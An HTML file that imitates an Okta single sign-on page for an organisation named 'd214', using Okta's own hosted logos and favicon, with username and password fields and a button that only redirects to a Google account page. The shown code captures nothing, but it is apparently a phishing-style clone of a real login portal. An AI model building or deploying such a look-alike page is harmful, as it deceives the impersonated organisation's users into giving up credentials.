<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>d214 - Sign In</title>  
    <link rel="shortcut icon" href="https://d214.okta.com/favicon.ico" type="image/x-icon">
  </head>
  <body>
    <div class="top-text">
      <div class="top-logo">
        <h2>Connecting to</h2>
        <img src="https://ok7static.oktacdn.com/fs/bcg/4/gfs7rdxe5zNNAVu0Y357">
      </div>
      <p>Sign in with your account to access G Suite</p>
      <hr>
    </div>
    <div class="login-container">
        <div class="logo">
          <img src="https://ok7static.oktacdn.com/fs/bco/1/fs02hasn9ufLTiEZm356">
        </div>
        <hr>
      <h3>Sign In</h3>
        <form autocomplete="off">
          <label for="username">Username</label>
          <input type="text" id="username" required>
          <label for="password">Password</label>
          <input type="password" id="password" required>
          <button type="button" onclick="window.location.href='https://myaccount.google.com/'">Sign In</button>
        </form>
      <div class="helpmenu">
        <p><u>Help menu</u></p>
      </div>
    </div>
    <div class="poweredprivacy">
      <div class="powered">
        <p>Powered by Okta</p>
      </div>
        <div class="privacy">
          <p>Privacy Policy</p>
        </div>
    </div>
  </body>
</html>
